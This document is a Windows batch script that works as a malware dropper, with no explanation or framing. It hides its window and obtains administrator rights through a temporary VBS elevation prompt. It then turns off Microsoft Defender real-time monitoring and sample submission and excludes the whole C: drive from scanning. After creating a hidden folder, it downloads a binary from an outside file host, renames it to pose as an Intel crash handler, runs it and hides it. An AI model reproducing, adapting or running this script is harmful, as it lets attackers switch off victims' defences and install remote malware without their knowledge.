
:----------------------------------------------------------------------------------------------------------------:
powershell -window hidden -command ""

:----------------------------------------------------------------------------------------------------------------:
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
:----------------------------------------------------------------------------------------------------------------:
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:----------------------------------------------------------------------------------------------------------------:
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
:----------------------------------------------------------------------------------------------------------------:
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:----------------------------------------------------------------------------------------------------------------:
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0
:----------------------------------------------------------------------------------------------------------------:
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -SubmitSamplesConsent NeverSend"
powershell -Command "Add-MpPreference -ExclusionPath "C:\
:----------------------------------------------------------------------------------------------------------------:
cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "Anon"
attrib +h "Anon" /s /d
cd C:\Users\%USERNAME%\AppData\Local\Anon" 
:----------------------------------------------------------------------------------------------------------------:
timeout /t 5 /nobreak
Powershell -Command "Invoke-Webrequest 'https://files.catbox.moe/3st2n6.bin' -OutFile GetMyNudes.bin"
timeout /t 10 /nobreak
REN "GetMyNudes.bin" "Intel(R)Crashhandler.exe"
timeout /t 3 /nobreak
start Intel(R)Crashhandler.exe
attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Intel(R)Crashhandler.exe" /s /d
:----------------------------------------------------------------------------------------------------------------:
